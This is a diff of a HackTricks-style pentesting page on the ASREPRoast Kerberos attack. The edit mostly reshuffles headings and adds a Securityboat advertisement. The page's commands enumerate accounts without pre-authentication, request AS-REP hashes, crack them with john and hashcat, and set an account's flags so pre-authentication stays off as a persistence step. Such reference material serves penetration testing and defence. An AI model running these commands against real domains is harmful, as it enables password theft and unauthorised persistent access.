@@ -1,4 +1,4 @@
-
+# ASREPRoast
 
 <details>
 
@@ -16,8 +16,14 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
 
-# ASREPRoast
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
+
+## ASREPRoast
 
 The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
 
@@ -25,13 +31,13 @@ That means that anyone can send an AS\_REQ request to the DC on behalf of any of
 
 Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.
 
-### Enumerating vulnerable users (need domain credentials)
+#### Enumerating vulnerable users (need domain credentials)
 
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
 
-### Request AS\_REP message
+#### Request AS\_REP message
 
 {% code title="Using Linux" %}
 ```bash
@@ -49,14 +55,14 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 ```
 {% endcode %}
 
-## Cracking
+### Cracking
 
 ```
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
 
-## Persistence
+### Persistence
 
 Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
 
@@ -66,6 +72,12 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 
 [**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
+
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
 
 <details>
 
@@ -82,5 +94,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
